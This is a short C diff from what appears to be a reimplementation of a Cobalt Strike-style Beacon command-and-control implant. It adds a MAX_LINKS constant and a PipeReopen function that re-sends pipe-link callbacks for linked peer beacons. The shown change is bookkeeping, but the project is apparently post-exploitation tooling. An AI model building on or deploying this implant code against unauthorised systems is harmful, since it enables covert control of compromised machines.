@@ -16,7 +16,8 @@ typedef struct _LINK_ENTRY
 	int lastPingTime;
 } LINK_ENTRY;
 
-LINK_ENTRY gLinks[28] = { 0 };
+#define MAX_LINKS 28
+LINK_ENTRY gLinks[MAX_LINKS] = { 0 };
 
 BOOL LinkAdd(PROTOCOL* protocol, int flags)
 {
@@ -129,4 +130,19 @@ void LinkViaTcp(char* data, int length)
 
 	DWORD error = WSAGetLastError();
 	BeaconErrorD(ERROR_CONNECT_TO_TARGET_FAILED, error);	
+}
+
+void PipeReopen(char* buffer, int size)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, size);
+	int bid = BeaconDataInt(&parser);
+	for (int i = 0; i < MAX_LINKS; i++)
+	{
+		if (gLinks[i].isOpen == TRUE && gLinks[i].bid == bid)
+		{
+			BeaconOutput(CALLBACK_PIPE_OPEN, gLinks[i].callbackData, gLinks[i].callbackLength);
+			break;
+		}
+	}
 }
